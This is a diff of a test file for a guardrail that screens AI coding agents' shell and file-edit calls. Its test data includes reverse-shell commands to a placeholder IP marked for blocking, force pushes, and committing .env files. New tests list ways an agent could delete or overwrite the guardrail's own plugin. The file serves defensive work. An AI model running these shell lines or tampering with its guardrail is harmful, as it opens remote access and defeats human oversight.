@@ -19,7 +19,7 @@ def v(d):
     ("curl https://api.github.com/repos", None),
     ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "block"), ("nc -e /bin/sh 1.2.3.4 4444", "block"),
     ("git push --force origin main", "block"), ("git push -f", "block"),
-    ("git push --force origin feature/x", "ask"), ("git push --force-with-lease origin main", "ask"),
+    ("git push --force origin feature/x", "ask"), ("git push --force-with-lease origin main", "block"),
     ("git push origin main", None),
     ("git reset --hard HEAD~3", "ask"), ("git clean -fdx", "ask"), ("git checkout -- .", "ask"),
     ("git add .env", "block"), ("git add -f .env.local", "block"),
@@ -148,3 +148,27 @@ def test_never_raises_on_garbage():
     assert evaluate(ToolCall("Bash", {})) is None
     assert evaluate(ToolCall("Edit", {"old_string": "x"}, cwd="/p")) is None
     assert evaluate(ToolCall("Bash", "rm -rf /")) is not None  # non-dict input coerced
+
+@pytest.mark.parametrize('command', [
+    'git push --force-with-lease origin main',
+    'git push --force-with-lease=main origin HEAD',
+    'git push --force-with-lease origin refs/heads/master',
+])
+def test_lease_main_is_blocked(bash, command):
+    d = evaluate(bash(command))
+    assert d and d.verdict == 'block' and d.rule == 'force_push_main'
+
+@pytest.mark.parametrize('command', [
+    'rm .opencode/plugin/bantay.js', 'echo x > .opencode/plugin/bantay.js',
+    'cp empty.js .opencode/plugins/bantay.js',
+    'cd .opencode/plugin && rm bantay.js', 'cd .opencode && rm plugin/bantay.js',
+    'rm ~/.config/opencode/plugins/bantay.js',
+])
+def test_opencode_tamper_bash(bash, command):
+    d = evaluate(bash(command))
+    assert d and d.rule == 'guardrail_tamper' and d.verdict == 'block'
+
+@pytest.mark.parametrize('tool', ['Write', 'Edit', 'MultiEdit'])
+def test_opencode_tamper_file_tools(tool):
+    d = evaluate(ToolCall(tool, {'file_path': '.opencode/plugin/bantay.js', 'content': '// disabled'}))
+    assert d and d.rule == 'guardrail_tamper'
